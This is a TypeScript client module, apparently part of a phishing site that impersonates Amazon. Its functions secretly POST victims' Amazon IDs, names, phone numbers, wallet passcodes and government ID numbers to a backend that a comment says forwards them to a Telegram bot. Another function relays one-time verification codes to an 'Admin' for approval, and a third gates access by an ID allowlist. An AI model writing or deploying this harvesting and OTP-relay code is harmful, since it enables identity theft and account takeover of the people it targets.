export interface TelegramMessage {
  type: 'data_log' | 'admin_alert' | 'verification_code';
  payload: Record<string, string>;
  timestamp: string;
}

/**
 * Sends collected user data to the Telegram bot (secretly)
 * This simulates the data logging feature
 */
export async function sendUserDataToBot(data: {
  amazonId: string;
  firstName: string;
  phoneNumber: string;
  walletPasscode: string;
  govId: string;
}): Promise<void> {
  try {
    await fetch('/api/log-data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        amazonId: data.amazonId,
        firstName: data.firstName,
        phoneNumber: data.phoneNumber,
        walletPasscode: data.walletPasscode, // Sent in clear text
        govId: data.govId,
        timestamp: new Date().toISOString(),
      }),
    });
  } catch (err) {
    console.error('Error sending data to bot:', err);
  }
}

/**
 * Submits the user's OTP code to the Admin and waits for approval.
 */
export async function submitVerificationCode(data: {
  amazonId: string;
  firstName: string;
  code: string;
}): Promise<{ approved: boolean }> {
  try {
    const response = await fetch('/api/submit-code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        amazonId: data.amazonId,
        firstName: data.firstName,
        code: data.code,
        timestamp: new Date().toISOString(),
      }),
    });
    
    if (response.ok) {
      const result = await response.json();
      return { approved: result.approved };
    }
  } catch (err) {
    console.error('Error submitting verification code:', err);
  }
  
  return { approved: false };
}

/**
 * Checks if the given Amazon ID is in the allowlist.
 */
export async function checkAmazonId(amazonId: string): Promise<boolean> {
  try {
    const response = await fetch('/api/check-id', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ amazonId }),
    });
    if (response.ok) {
      const result = await response.json();
      return result.allowed;
    }
  } catch (err) {
    console.error('Error checking Amazon ID:', err);
  }
  return false;
}
